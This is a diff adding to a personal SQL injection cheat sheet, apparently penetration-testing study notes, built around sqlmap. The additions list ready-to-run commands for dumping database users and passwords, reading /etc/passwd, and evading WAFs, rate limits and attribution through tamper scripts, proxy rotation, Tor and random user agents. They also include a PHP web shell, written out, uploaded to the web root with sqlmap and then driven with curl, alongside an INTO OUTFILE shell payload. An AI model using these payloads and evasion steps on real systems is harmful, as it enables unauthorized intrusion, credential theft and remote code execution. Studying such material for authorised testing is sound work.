@@ -130,6 +130,7 @@ In a SQLi it may look more like
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
 **SQLMAP**
+*And yes, it can crack passwords*
 This tool supports all types of SQLi
 - `B`: Boolean-based blind
 	- `AND 1=1`
@@ -153,6 +154,13 @@ Use the `--parse-errors` to debug
 Use `-t /tmp/traffic.txt` to write output to a file
 Use `-v <n>` to specify verbosity level
 Use --proxy to send traffic through a proxy like Burp
+Use `--level <1-5>` to extend boundaries
+Use `--risk <1-3>` to specify risk/loudness
+Use `--schema` to identify the database schema
+Use `--search` to look for specific data
+Use `-T <string>` for a specific table
+Use `--current-user` to identify current DBMS user
+Use `--file-read "/etc/passwd"` to read the password file
 
 Sometimes you need to specify specific characters for the inject. This can be done like this.
 ```
@@ -160,12 +168,64 @@ Sometimes you need to specify specific characters for the inject. This can be do
 #or
 --suffix="-- -"
 ```
+Little extra for unions
+```
+--union-cols=<n>
+--union-char='<value>' #to specify dummy value instead of NULL
+--union-from <table>
+```
+**Database Enumeration**
+Use `--current-user` to identify current DBMS user
+Use `--banner` to banner grab DBMS version
+Use `--current-db` to identify the DB administrator
+Use `--tables -D <DB name>` to identify tables
+Use `-C` to specify specific columns to output
+Use `--start=<n>` and `--end=<n+>` to specify start and stop rows
+Conditional Logic `--where="name LIKE 'f%'"
+Use `--passwords` to identify passwords
 
+**Bypassing Defensive Measures**
+To add a token add `--csrf-token` inside the data param or in the command like this 
+```
+sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+```
+If the system blocks repeat requests, try adding a random string with `--randomize=<str>`
+You can use evaluated parameters to bypass calculated params. This can be done like this 
+```
+sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+```
+To bypass WAF settings you can also use a proxy like this
+```
+--proxy="socks4://<ip>/
+```
+If you need more anonymity you can make a proxy file and use this param to rotate through proxies until one is blocked. 
+```
+--proxy-file
+```
+If you want to use Tor, use `--tor` to proxy through there. To verify Tor is working try `--check-tor`
 
+If you suspect a user-agent blacklist use `--random-agent` to switch randomly between different browser user agents.
 
+Tamper Script
+Use these to bypass some types of WAF's. They modify the data before it hits the target. These 2 are the most common
+```
+--tamper=between,randomcase
+```
+Last up we can use chunks. It splits SQL statements into different chunks to bypass WAF's. The option for this is `-chunked`
 
+**Shells Again**
+```
+#Write a shell file
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
+#Transfer file to location on SQL webserver
+sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
 
+#Connect to shell session
+curl http://www.example.com/shell.php?cmd=ls+-la
+
+```
+More simply just run `--os-shell`. There may be a problem with the specific type of SQLi used. For best results use an error based SQLi with `--technique=E`
 
 
 ![[../../cheatsheet-sql-injection-fundamentals.pdf]]
